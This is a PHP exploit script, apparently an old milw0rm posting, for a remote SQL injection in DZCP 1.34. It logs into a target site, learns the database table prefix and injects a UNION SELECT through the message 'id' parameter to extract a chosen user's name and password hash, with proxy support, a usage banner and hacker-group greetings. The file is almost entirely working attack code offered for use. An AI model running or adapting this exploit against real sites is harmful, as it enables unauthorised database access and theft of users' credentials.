<?
error_reporting(E_ERROR);

function exploit_init()
{
    if (!extension_loaded('php_curl') && !extension_loaded('curl'))
    {
       if (!dl('curl.so') && !dl('php_curl.dll'))
       die ("oo error - cannot load curl extension!");
    }
}

function exploit_header()
{
    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
    echo "                                  oo    ooooooo     ooooooo\n";
    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
    echo "                      888o888    888        o888   888888888\n";
    echo "                      o88888o    888     o888   o 888o   o888\n";
    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
    echo "oooooooooooooooooooooooo dzcp 1.34 remote sql injection oooooooooooooooooooooooo\n";
    echo "oo usage          $ php dzcp-134-exploit.php [url] [user] [pwd] [id]\n";
    echo "oo proxy support  $ php dzcp-134-exploit.php [url] [user] [pwd] [id]\n";
    echo "                  [proxy]:[port]\n";
    echo "oo example        $ php dzcp-134-exploit.php http://localhost x128 pwd 1\n";
    echo "oo you need an account on the system\n";
    echo "oo print the password of the user\n\n";
}

function exploit_bottom()
{
    echo "\noo greets   : tlm65 - i want to wish you a happy 23st birthday! thank you for\n";
    echo "              the last two years. we never become the fastest hacking group on\n";
    echo "              net without you.\n";
    echo "oo discover : x128 - alexander wilhelm - 30/06/2006\n";
    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net\n";
}

function exploit_execute()
{
    $connection = curl_init();

    if ($_SERVER['argv'][5])
    {
        curl_setopt($connection, CURLOPT_TIMEOUT, 8);
        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][5]);
    }
    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');
    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($connection, CURLOPT_HEADER, 0);
    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_COOKIE, 1);
    curl_setopt ($connection, CURLOPT_COOKIEJAR, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_COOKIEFILE, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/user/index.php?action=login&do=yes");
    curl_setopt ($connection, CURLOPT_POSTFIELDS, "user=" . $_SERVER['argv'][2] . "&pwd=" . $_SERVER['argv'][3] . "&permanent=1");

    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    curl_setopt ($connection, CURLOPT_POST, 0);
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/user/index.php?action=msg&do=answer&id=x128");
    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    preg_match("/FROM ([0-9a-zA-Z_]*)messages/", $source, $prefix);

    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/user/index.php?action=msg&do=answer&id=" . urlencode("-1 UNION SELECT 1,1,1,1,1,1,user,pwd,1,1 FROM " . $prefix[1] . "users WHERE id = " . $_SERVER['argv'][4]));
    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    preg_match("/>([0-9a-f]{32})</", $source, $password);
    preg_match("/RE: (.*)\" class/", $source, $user);

    if ($password[1])
    {
        echo "oo user           " . $user[1] . "\n";
        echo "oo password       " . $password[1] . "\n\n";
        echo "oo dafaced ...\n";
    }

    curl_close ($connection);
}

exploit_init();
exploit_header();
exploit_execute();
exploit_bottom();
?>

# milw0rm.com [2006-07-01]
